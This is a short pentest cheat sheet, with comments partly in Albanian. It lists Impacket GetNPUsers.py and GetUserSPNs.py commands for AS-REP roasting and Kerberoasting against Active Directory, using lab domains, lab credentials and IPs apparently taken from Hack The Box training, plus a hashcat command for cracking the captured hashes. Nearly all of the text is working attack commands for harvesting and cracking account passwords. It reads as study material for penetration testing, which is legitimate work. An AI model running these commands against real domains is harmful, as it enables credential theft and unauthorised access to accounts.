
Impacket's [GetNPUsers.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py) script can be used to enumerate users with their UAC value set to `DONT_REQ_PREAUTH`.

```bash
# Liston te gjitha userat qe kan DONT_REQ_PREAUTH aktive ne sistem
GetNPUsers.py INLANEFREIGHT.LOCAL/htb-student:HTB_@cademy_stdnt! -dc-ip 10.129.205.35 -request

# AS-REPRoastable Users Enumeration
GetNPUsers.py inlanefreight.local/pixis

# Requesting AS-REPRoastable Hashes
GetNPUsers.py inlanefreight.local/pixis -request

# Finding AS-REPRoastable Accounts without Authentication
GetNPUsers.py INLANEFREIGHT/ -dc-ip 10.129.205.35 -usersfile users.txt -format hashcat -outputfile /tmp/hashes.txt -no-pass

# Finding Pre-Authentication user who have disable
GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -dc-ip 10.129.11.199 -usersfile usersname.txt -request

# WE can see user who SPN
./GetUserSPNs.py scrm.local/ksimpson -dc-host dc1.scrm.local -k

# Request the hash ose dhe SPN
./GetUserSPNs.py scrm.local/ksimpson -dc-host dc1.scrm.local -k -no-pass -request

# Cracking Hashes from Linux
hashcat -m 18200 hashes.txt rockyou.txt
```


`AS-REPRoasting` is a powerful technique to find and crack passwords of accounts with `pre-authentication` disabled.
